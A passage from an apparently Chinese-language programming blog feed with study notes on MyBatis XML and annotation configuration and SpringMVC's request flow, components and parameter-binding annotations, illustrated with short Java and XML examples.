id="typeHandlers"><a href="#typeHandlers" class="headerlink" title="typeHandlers"></a>typeHandlers</h3><table><thead><tr><th>父标签</th><th>子标签1</th><th>属性名</th><th>属性功能</th></tr></thead><tbody><tr><td>typeHandlers</td><td>typeHandler</td><td>handler</td><td>指定handler类全限定名</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">typeHandlers</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">typeHandler</span> <span class="hljs-attr">handler</span>=<span class="hljs-string">&quot;com.example.handler.DateTypeHandler&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">typeHandler</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">typeHandlers</span>&gt;</span></code></pre></div><h3 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h3><table><thead><tr><th>父标签</th><th>子标签1</th><th>子标签2</th><th>属性名</th><th>属性功能</th></tr></thead><tbody><tr><td>plugins</td><td>plugin</td><td></td><td>interceptor</td><td>指定使用的插件的类全限定名</td></tr><tr><td></td><td></td><td>property</td><td>name</td><td></td></tr><tr><td></td><td></td><td></td><td>value</td><td></td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">interceptor</span>=<span class="hljs-string">&quot;com.github.pagehelper.PageHelper&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dialect&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;mysql&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></code></pre></div><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">typeAlias</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;org.example.domain.User&quot;</span> <span class="hljs-attr">alias</span>=<span class="hljs-string">&quot;user&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">transactionManager</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;org/example/mapper/userMapper.xml&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre></div><h2 id="编写测试类"><a href="#编写测试类" class="headerlink" title="编写测试类"></a>编写测试类</h2><h3 id="Mybatis的API使用"><a href="#Mybatis的API使用" class="headerlink" title="Mybatis的API使用"></a>Mybatis的API使用</h3><h3 id="SqlSessionFactoryBuilder"><a href="#SqlSessionFactoryBuilder" class="headerlink" title="SqlSessionFactoryBuilder"></a>SqlSessionFactoryBuilder</h3><p>SqlSession工厂构建器，通过加载mybatis的核心文件的输入流的形式构建一个SqlSessionFactory对象</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">SqlSessionFactoryBuilder</span> <span class="hljs-variable">sqlSessionFactoryBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>();<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(<span class="hljs-string">&quot;mybatis.xml&quot;</span>);<span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> sqlSessionFactoryBuilder.build(inputStream);</code></pre></div><h3 id="SqlSessionFactory"><a href="#SqlSessionFactory" class="headerlink" title="SqlSessionFactory"></a>SqlSessionFactory</h3><p>SqlSession工厂对象，创建SqlSession对象</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//需要手动提交事务</span><span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();<span class="hljs-comment">//设置自动提交事务</span><span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession(<span class="hljs-literal">true</span>);</code></pre></div><h3 id="SqlSession"><a href="#SqlSession" class="headerlink" title="SqlSession"></a>SqlSession</h3><p>SqlSession会话对象，通过对象来执行sql语句、操作事务等</p><div class="code-wrapper"><pre><code class="hljs scss">sqlSession<span class="hljs-selector-class">.getMapper</span>()<span class="hljs-comment">//接口代理</span>sqlSession<span class="hljs-selector-class">.select</span>()<span class="hljs-comment">//CRUD</span>sqlSession<span class="hljs-selector-class">.commit</span>()sqlSession<span class="hljs-selector-class">.close</span>()</code></pre></div><h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">SqlSessionFactoryBuilder</span> <span class="hljs-variable">sqlSessionFactoryBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>();<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(<span class="hljs-string">&quot;mybatis.xml&quot;</span>);<span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> sqlSessionFactoryBuilder.build(inputStream);<span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();List&lt;User&gt; list = sqlSession.selectList(<span class="hljs-string">&quot;userMapper.queryAll&quot;</span>);sqlSession.commit();System.out.println(list);sqlSession.close();</code></pre></div><h1 id="基于注解方式开发"><a href="#基于注解方式开发" class="headerlink" title="基于注解方式开发"></a>基于注解方式开发</h1><h2 id="创建实体类数据库表-1"><a href="#创建实体类数据库表-1" class="headerlink" title="创建实体类数据库表"></a>创建实体类数据库表</h2><h2 id="创建数据表对应java类-1"><a href="#创建数据表对应java类-1" class="headerlink" title="创建数据表对应java类"></a>创建数据表对应java类</h2><h2 id="创建Dao层mapper映射接口"><a href="#创建Dao层mapper映射接口" class="headerlink" title="创建Dao层mapper映射接口"></a>创建Dao层mapper映射接口</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mapper;<span class="hljs-keyword">import</span> com.example.domain.User;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Delete;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Update;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;    <span class="hljs-meta">@Insert(&quot;insert into user values(#&#123;id&#125;,#&#123;name&#125;,#&#123;money&#125;,#&#123;birthday&#125;)&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(User user)</span>;    <span class="hljs-meta">@Update(&quot;update user set name=#&#123;name&#125;,money=#&#123;money&#125; where id=#&#123;id&#125;&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(User user)</span>;    <span class="hljs-meta">@Delete(&quot;delete from user where id=#&#123;id&#125;&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>;    <span class="hljs-meta">@Select(&quot;select * from user where id=#&#123;id&#125;&quot;)</span>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>;    <span class="hljs-meta">@Select(&quot;select * from user&quot;)</span>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findAll</span><span class="hljs-params">()</span>;&#125;</code></pre></div><h2 id="创建properties属性文件"><a href="#创建properties属性文件" class="headerlink" title="创建properties属性文件"></a>创建properties属性文件</h2><h2 id="创建xml核心配置文件-1"><a href="#创建xml核心配置文件-1" class="headerlink" title="创建xml核心配置文件"></a>创建xml核心配置文件</h2><p>与配置文件开发不同的唯一一点是注解开发mappers采用加载package包来加载</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-comment">&lt;!--    加载properties文件--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><span class="hljs-comment">&lt;!--    数据源环境--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transactionManager</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><span class="hljs-comment">&lt;!--    映射器--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.example.mapper&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre></div><h2 id="编写测试类-1"><a href="#编写测试类-1" class="headerlink" title="编写测试类"></a>编写测试类</h2>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SpringMVC</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/SpringMVC%E7%90%86%E8%AE%BA/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/SpringMVC%E7%90%86%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><p><strong>SpringMVC</strong> 是一种基于 Java 的实现 <strong>MVC 设计模型</strong>的请求驱动类型的轻量级 <strong>Web 框架</strong>。它通过一套注解，让一个简单的 Java 类成为处理请求的控制器，而无须实现任何接口。同时它还支持 <strong>RESTful</strong> 编程风格的请求。客户端发起请求，服务器端接收请求，执行逻辑并进行视图跳转。</p><h1 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h1><p><strong>图示流程</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230101221146058.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230101221206764.png"></p><p>① 用户发送请求至前端控制器DispatcherServlet。</p><p>② DispatcherServlet收到请求调用HandlerMapping处理器映射器。</p><p>③ 处理器映射器找到具体的处理器(可以根据xml配置、注解进行查找)，生成处理器对象及处理器拦截器(如果</p><p>有则生成)一并返回给DispatcherServlet。</p><p>④ DispatcherServlet调用HandlerAdapter处理器适配器。</p><p>⑤ HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器)。</p><p>⑥ Controller执行完成返回ModelAndView。</p><p>⑦ HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet。</p><p>⑧ DispatcherServlet将ModelAndView传给ViewReslover视图解析器。</p><p>⑨ ViewReslover解析后返回具体View。</p><p>⑩ DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）。DispatcherServlet响应用户。</p><h1 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h1><ul><li>DispatcherServlet</li></ul><p>前端控制器。用户请求到达前端控制器，它就相当于 MVC 模式中的 C，DispatcherServlet 是整个流程控制的中心，由它调用其它组件处理用户的请求，DispatcherServlet 的存在降低了组件之间的耦合性。</p><ul><li>HandlerMapping</li></ul><p>处理器映射器：HandlerMapping。HandlerMapping 负责根据用户请求找到 Handler 即处理器，SpringMVC 提供了不同的映射器实现不同的映射方式，例如：配置文件方式，实现接口方式，注解方式等。</p><ul><li>HandlerAdapter</li></ul><p>处理器适配器：HandlerAdapter。通过 HandlerAdapter 对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。</p><ul><li>Handler</li></ul><p>处理器：Handler。它就是我们开发中要编写的具体业务控制器。由 DispatcherServlet 把用户请求转发到 Handler。由Handler 对具体的用户请求进行处理。</p><ul><li>View Resolver</li></ul><p>视图解析器：View Resolver。View Resolver 负责将处理结果生成 View 视图，View Resolver 首先根据逻辑视图名解析成物理视图名，即具体的页面地址，再生成 View 视图对象，最后对 View 进行渲染将处理结果通过页面展示给用户。</p><ul><li>View</li></ul><p>视图：View。SpringMVC 框架提供了很多的 View 视图类型的支持，包括：jstlView、freemarkerView、pdfView等。最常用的视图就是 jsp。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。</p><h1 id="注解介绍"><a href="#注解介绍" class="headerlink" title="注解介绍"></a>注解介绍</h1><h2 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h2><table><thead><tr><th>作用</th><th>请求映射，将URL请求与JAVA方法绑定。</th></tr></thead><tbody><tr><td>位置</td><td>使用在类上，请求URL的第一级访问目录。若未定义，则默认访问web的根目录</td></tr><tr><td></td><td>使用在方法上，请求URI的第二级访问目录。与定义在类上的@ReqquestMapping标注的一级目录一起组成访问虚拟路径</td></tr></tbody></table><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>value</td><td>指定请求参数名</td></tr><tr><td>method</td><td>指定http请求方式</td></tr><tr><td>params</td><td>用于指定限制请求参数的条件</td></tr></tbody></table><p><strong>代码示例</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//请求URL：http://localhost:8080/request/test1?username=caofalin</span><span class="hljs-meta">@RequestMapping(value=&quot;/request&quot;,method = RequestMethod.GET)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">requestController</span> &#123;    <span class="hljs-meta">@RequestMapping(value=&quot;/test1&quot;)</span>    <span class="hljs-meta">@ResponseBody</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> IOException &#123;        System.out.println(username);    &#125;&#125;</code></pre></div><h2 id="RequestParam"><a href="#RequestParam" class="headerlink" title="@RequestParam"></a>@RequestParam</h2><table><thead><tr><th>作用</th><th>参数绑定。当请求URL的参数名称与业务方法的形参名称不一致时，将请求URL中的参数名与业务方法的形参进行绑定</th></tr></thead><tbody><tr><td>位置</td><td>使用在方法的形参上</td></tr></tbody></table><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>value</td><td>指定请求URL中的请求参数名</td></tr><tr><td>required</td><td>此在指定的请求参数是否必须包括，默认是true，提交时如果没有此参数则报错</td></tr><tr><td>defaultValue</td><td>当没有指定请求参数时，则使用指定的默认值赋值</td></tr></tbody></table><h2 id="PathVariable"><a href="#PathVariable" class="headerlink" title="@PathVariable"></a>@PathVariable</h2><table><thead><tr><th>作用</th><th>RESTful风格请求参数绑定。将请求URL中的参数名与业务方法的形参进行绑定</th></tr></thead><tbody><tr><td>位置</td><td>使用在方法的形参上</td></tr></tbody></table><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>value</td><td>指定请求URL中的请求参数名</td></tr><tr><td>required</td><td>此在指定的请求参数是否必须包括，默认是true，提交时如果没有此参数则报错</td></tr><tr><td>defaultValue</td><td>当没有指定请求参数时，则使用指定的默认值赋值</td></tr></tbody></table><p><strong>代码示例</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//请求URL：http://localhost:8080/request/test/caofalin</span><span class="hljs-meta">@RequestMapping(&quot;/request&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">requestController</span> &#123;<span class="hljs-meta">@RequestMapping(value=&quot;/test/&#123;name&#125;&quot;)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(value=&quot;name&quot;,required=false,defaultValue=&quot;caofalin&quot;)</span> String username)</span> <span class="hljs-keyword">throws</span> IOException &#123;    System.out.println(username);&#125;&#125;</code></pre></div><h2 id="RequestHeader"><a href="#RequestHeader" class="headerlink" title="@RequestHeader"></a>@RequestHeader</h2><table><thead><tr><th>作用</th><th>获取HTTP请求数据包的HttpHeader信息</th></tr></thead><tbody><tr><td>位置</td><td>使用在方法的形参上</td></tr></tbody></table><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>value</td><td>设置需要获取的http请求头信息的key值</td></tr><tr><td>required</td><td>此在指定的请求参数是否必须包括，默认是true，提交时如果没有此参数则报错</td></tr></tbody></table><p><strong>代码示例</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//请求URL：http://localhost:8080/request/test</span><span class="hljs-meta">@RequestMapping(&quot;/request&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">requestController</span> &#123;<span class="hljs-meta">@RequestMapping(value=&quot;/test&quot;)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-meta">@RequestHeader(value = &quot;User-Agent&quot;,required = false)</span> String user_agent)</span> <span class="hljs-keyword">throws</span> IOException &#123;    System.out.println(user_agent);&#125;&#125;</code></pre></div><h2 id="CookieValue"><a href="#CookieValue" class="headerlink" title="@CookieValue"></a>@CookieValue</h2><table><thead><tr><th>作用</th><th>获得指定Cookie的值</th></tr></thead><tbody><tr><td>位置</td><td>使用在方法的形参上</td></tr></tbody></table><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>value</td><td>指定cookie的名称</td></tr><tr><td>required</td><td>此在指定的请求参数是否必须包括，默认是true，提交时如果没有此参数则报错</td></tr></tbody></table><p><strong>代码示例</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//请求URL：http://localhost:8080/request/test</span><span class="hljs-meta">@RequestMapping(&quot;/request&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">requestController</span> &#123;<span class="hljs-meta">@RequestMapping(value=&quot;/test&quot;)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;JSESSIONID&quot;)</span> String jsessionId)</span> <span class="hljs-keyword">throws</span> IOException &#123;    System.out.println(jsessionId);&#125;</code></pre></div><h2 id="ResponseBody"><a href="#ResponseBody" class="headerlink" title="@ResponseBody"></a>@ResponseBody</h2><table><thead><tr><th>作用</th><th>指定数据响应的方式为非页面跳转，根据业务方法的返回值类型返回数据</th></tr></thead><tbody><tr><td>位置</td><td>使用在方法上</td></tr></tbody></table><p><strong>代码示例</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//请求URL：http://localhost:8080/request/test</span><span class="hljs-meta">@RequestMapping(value=&quot;/request&quot;,method = RequestMethod.GET)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">requestController</span> &#123;    <span class="hljs-meta">@RequestMapping(value=&quot;/test&quot;)</span>    <span class="hljs-meta">@ResponseBody</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test</span><span class="hljs-params">()</span>  &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;return string&quot;</span>;<span class="hljs-comment">//直接返回字符串</span>    &#125;&#125;</code></pre></div><h1 id="数据响应"><a href="#数据响应" class="headerlink" title="数据响应"></a>数据响应</h1><h2 id="数据响应方式"><a href="#数据响应方式" class="headerlink" title="数据响应方式"></a>数据响应方式</h2><p>1） 页面跳转</p><p>直接返回字符串</p><p>通过ModelAndView对象返回</p><p>2） 回写数据</p><p>直接返回字符串</p><p>返回对象或集合</p><h2 id="响应数据的处理"><a href="#响应数据的处理" class="headerlink" title="响应数据的处理"></a>响应数据的处理</h2><h2 id="字符串转json格式"><a href="#字符串转json格式" class="headerlink" title="字符串转json格式"></a>字符串转json格式</h2><h1 id="数据请求"><a href="#数据请求" class="headerlink" title="数据请求"></a>数据请求</h1><h2 id="接收参数类型"><a href="#接收参数类型" class="headerlink" title="接收参数类型"></a>接收参数类型</h2><ul><li><p>基本类型参数</p></li><li><p>POJO类型参数</p></li><li><p>数组类型参数</p></li><li><p>集合类型参数</p></li></ul><h2 id="RESTful风格"><a href="#RESTful风格" class="headerlink" title="RESTful风格"></a>RESTful风格</h2><p>Todo</p><h2 id="中文数据乱码"><a href="#中文数据乱码" class="headerlink" title="中文数据乱码"></a>中文数据乱码</h2><p>当post请求时，数据会出现乱码，需要在web.xml中设置一个过滤器来进行编码的过滤</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span></code></pre></div><h2 id="自定义数据类型转换"><a href="#自定义数据类型转换" class="headerlink" title="自定义数据类型转换"></a>自定义数据类型转换</h2><p><strong>自定义类型转换器</strong></p><p>SpringMVC 默认已经提供了一些常用的类型转换器，例如客户端提交的字符串转换成int型进行参数设置。</p><ul><li>但是不是所有的数据类型都提供了转换器，没有提供的就需要自定义转换器，例如：日期类型的数据就需要自</li></ul><p>定义转换器。</p><p>自定义类型转换器的开发步骤：</p><p>① 定义转换器类实现Converter接口</p><p>② 在配置文件中声明转换器</p><p>③ 在中引用转换器</p><h2 id="获得Servlet相关API"><a href="#获得Servlet相关API" class="headerlink" title="获得Servlet相关API"></a>获得Servlet相关API</h2><p>SpringMVC支持使用原始ServletAPI对象作为控制器方法的参数进行注入，常用的对象如下：</p><p>HttpServletRequest</p><p>HttpServletResponse</p><p>HttpSession</p><p><strong>代码示例</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//请求URL：http://localhost:8080/request/test</span><span class="hljs-meta">@RequestMapping(&quot;/request&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">requestController</span> &#123;<span class="hljs-meta">@RequestMapping(value=&quot;/test&quot;)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, HttpSession session)</span> <span class="hljs-keyword">throws</span> IOException &#123;    